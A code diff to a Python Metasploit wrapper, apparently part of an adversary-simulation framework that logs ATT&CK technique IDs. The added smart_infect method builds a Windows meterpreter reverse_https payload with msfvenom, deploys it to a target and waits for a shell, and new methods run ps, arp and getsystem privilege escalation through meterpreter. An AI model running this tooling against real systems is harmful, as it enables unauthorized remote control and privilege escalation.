@@ -23,6 +23,7 @@ class Metasploit():
         """
 
         self.password = password
+        self.username = kwargs.get("username", None)
         self.kwargs = kwargs
         self.client = None
 
@@ -31,7 +32,7 @@ class Metasploit():
         self.attacker = kwargs.get("attacker", None)
         if self.attacker:
             # we expect a running attacker but without a running msfrcpd
-            self.start_msfrpcd(kwargs.get("username"))
+            self.start_msfrpcd()
             kwargs["server"] = self.attacker.get_ip()
             time.sleep(3)   # Waiting for server to start. Or we would get https connection errors when getting the client.
 
@@ -51,24 +52,32 @@ class Metasploit():
         print(res)
         return res
 
-    def start_msfrpcd(self, username):
+    def start_msfrpcd(self):
         """ Starts the msfrpcs on the attacker. Metasploit must alredy be installed there ! """
 
-        cmd = f"msfrpcd -P {self.password} -U {username} -S"
+        cmd = f"nohup msfrpcd -P {self.password} -U {self.username} -S &"
 
         self.attacker.remote_run(cmd, disown=True)
+        # print("msfrpcd started")
+        # breakpoint()
+        time.sleep(3)
 
     def get_client(self):
         """ Get a local metasploit client connected to the metasploit server """
+
+        # print("starting get client")
+        # print(f"Password: {self.password}")
+        # print(f"Kwargs: {self.kwargs}")
+
         if self.client:
             return self.client
         self.client = MsfRpcClient(self.password, **self.kwargs)
+        # print(f"Got client {self.client}")
         return self.client
 
-    def wait_for_session(self):
+    def wait_for_session(self, retries=50):
         """ Wait until we get a session """
 
-        retries = 50
         while self.get_client().sessions.list == {}:
             time.sleep(1)
             print(f"Waiting to get any session {retries}")
@@ -158,6 +167,33 @@ class Metasploit():
             res.append(r)
 
         return res
+
+    def smart_infect(self, target, payload_type="windows/x64/meterpreter/reverse_https", payload_name="babymetal.exe"):
+        """ Checks if a target already has a meterpreter session open. Will deploy a payload if not """
+
+        # TODO Smart_infect should detect the platform of the target and pick the proper parameters based on that
+
+        try:
+            self.start_exploit_stub_for_external_payload(payload=payload_type)
+            self.wait_for_session(2)
+        except MetasploitError:
+
+            self.attack_logger.vprint(
+                f"{CommandlineColors.OKCYAN}Create payload {payload_name} replacement{CommandlineColors.ENDC}",
+                1)
+            venom = MSFVenom(self.attacker, target, self.attack_logger)
+            venom.generate_and_deploy(payload=payload_type,
+                                      architecture="x64",
+                                      platform="windows",
+                                      lhost=self.attacker.get_ip(),
+                                      format="exe",
+                                      outfile=payload_name)
+            self.attack_logger.vprint(
+                f"{CommandlineColors.OKCYAN}Execute {payload_name} replacement - waiting for meterpreter shell{CommandlineColors.ENDC}",
+                1)
+
+            self.start_exploit_stub_for_external_payload(payload=payload_type)
+            self.wait_for_session()
 
 ##########################################################################
 
@@ -286,3 +322,89 @@ class MSFVenom():
         self.attack_logger.vprint(
             f"{CommandlineColors.OKCYAN}Executed payload {payload_name} on {self.target.get_name()} {CommandlineColors.ENDC}",
             1)
+
+################
+
+
+class MetasploitInstant(Metasploit):
+    """ A simple metasploit class with pre-defined metasploit attacks and logging. Just add water
+
+    The attacks pre-defioned in here are the bread-and-butter attacks, the most basic ones. Those you will need all the time when simulating and adversary.
+    No need to add specific/specific ones in here. In attack plugins you will find all the features as well. Better code them there.
+
+    """
+
+    def __init__(self, password, attack_logger, **kwargs):
+        """
+
+        :param password: password for the msfrpcd
+        :param attack_logger: The attack logging
+        :param kwargs: Relevant ones: uri, port, server, username
+        """
+        super().__init__(password, **kwargs)
+        self.attack_logger = attack_logger
+
+    def ps_process_discovery(self, target):
+        """ Do a process discovery on the target """
+
+        command = "ps -ax"
+        ttp = "T1057"
+
+        self.attack_logger.vprint(
+            f"{CommandlineColors.OKCYAN}Execute {command} through meterpreter{CommandlineColors.ENDC}", 1)
+
+        self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
+                                                   target=target.get_ip(),
+                                                   metasploit_command=command,
+                                                   ttp=ttp)
+        res = self.meterpreter_execute_on([command], target)
+        print(res)
+        self.attack_logger.stop_metasploit_attack(source=self.attacker.get_ip(),
+                                                  target=target.get_ip(),
+                                                  metasploit_command=command,
+                                                  ttp=ttp)
+        return res
+
+    def arp_network_discovery(self, target):
+        """ Do a network discovery on the target """
+
+        command = "arp"
+        ttp = "T1016"
+
+        self.attack_logger.vprint(
+            f"{CommandlineColors.OKCYAN}Execute {command} through meterpreter{CommandlineColors.ENDC}", 1)
+
+        self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
+                                                   target=target.get_ip(),
+                                                   metasploit_command=command,
+                                                   ttp=ttp)
+        res = self.meterpreter_execute_on([command], target)
+        print(res)
+        self.attack_logger.stop_metasploit_attack(source=self.attacker.get_ip(),
+                                                  target=target.get_ip(),
+                                                  metasploit_command=command,
+                                                  ttp=ttp)
+        return res
+
+    def getsystem(self, target):
+        """ Do a network discovery on the target """
+
+        command = "getsystem"
+        ttp = "????"   # It uses one out of three different ways to elevate privileges.
+        # https://docs.rapid7.com/metasploit/meterpreter-getsystem/
+
+        self.attack_logger.vprint(
+            f"{CommandlineColors.OKCYAN}Execute {command} through meterpreter{CommandlineColors.ENDC}", 1)
+
+        self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
+                                                   target=target.get_ip(),
+                                                   metasploit_command=command,
+                                                   ttp=ttp)
+        res = self.meterpreter_execute_on([command], target)
+        print(res)
+        self.attack_logger.stop_metasploit_attack(source=self.attacker.get_ip(),
+                                                  target=target.get_ip(),
+                                                  metasploit_command=command,
+                                                  ttp=ttp)
+        return res
+
